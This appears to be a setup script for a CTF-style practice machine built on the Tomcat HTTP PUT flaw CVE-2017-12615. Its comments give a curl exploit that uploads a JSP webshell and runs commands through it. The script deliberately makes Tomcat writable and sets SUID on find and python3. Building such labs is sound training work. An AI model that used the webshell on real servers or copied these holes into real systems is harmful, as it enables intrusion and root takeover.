#!/bin/bash
# CVE-2017-12615: Tomcat 8.5.19 HTTP PUT allows JSP upload
# Foothold: Upload JSP webshell via HTTP PUT (readonly=false in DefaultServlet)
# Exploit:
#   curl -X PUT "http://TARGET/shell.jsp/" --data-binary '<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>'
#   Then: curl "http://TARGET/shell.jsp?cmd=id"
# User: root (old Tomcat Docker images run as root)
# Privesc: root can write to /home/ckplayer/user.txt and /root/root.txt directly

# Enable PUT method by setting DefaultServlet readonly=false
WEBXML=/usr/local/tomcat/conf/web.xml
if grep -q 'DefaultServlet' "$WEBXML" && ! grep -q 'readonly.*false' "$WEBXML"; then
    # Insert readonly=false init-param after the debug init-param
    sed -i 's|<param-value>0</param-value>\n|<param-value>0</param-value>\n        </init-param>\n        <init-param>\n            <param-name>readonly</param-name>\n            <param-value>false</param-value>|' "$WEBXML" 2>/dev/null || \
    python3 -c "
import re, sys
data = open('$WEBXML').read()
data = data.replace(
    '<param-name>debug</param-name>\n            <param-value>0</param-value>',
    '<param-name>debug</param-name>\n            <param-value>0</param-value>\n        </init-param>\n        <init-param>\n            <param-name>readonly</param-name>\n            <param-value>false</param-value>'
)
open('$WEBXML','w').write(data)
" 2>/dev/null
fi

# Fallback: write a simple version of web.xml with readonly=false
if ! grep -q 'readonly.*false' "$WEBXML" 2>/dev/null; then
    # Just append the init-param via a Python one-liner
    python3 - << 'PYEOF'
import xml.etree.ElementTree as ET
tree = ET.parse('/usr/local/tomcat/conf/web.xml')
root = tree.getroot()
ns = {'ns': 'http://java.sun.com/xml/ns/javaee'}
for servlet in root.iter('{http://java.sun.com/xml/ns/javaee}servlet'):
    sname = servlet.find('{http://java.sun.com/xml/ns/javaee}servlet-name')
    if sname is not None and sname.text == 'default':
        ip = ET.SubElement(servlet, '{http://java.sun.com/xml/ns/javaee}init-param')
        pn = ET.SubElement(ip, '{http://java.sun.com/xml/ns/javaee}param-name')
        pn.text = 'readonly'
        pv = ET.SubElement(ip, '{http://java.sun.com/xml/ns/javaee}param-value')
        pv.text = 'false'
        break
tree.write('/usr/local/tomcat/conf/web.xml', xml_declaration=True, encoding='UTF-8')
PYEOF
fi

# Privesc setup: sudo rule for escalation practice (Tomcat runs as root)
# ckplayer -> root is trivial since Tomcat is root; add SUID as an alternative path
chmod u+s /usr/bin/find 2>/dev/null || true
chmod u+s /usr/bin/python3 2>/dev/null || true
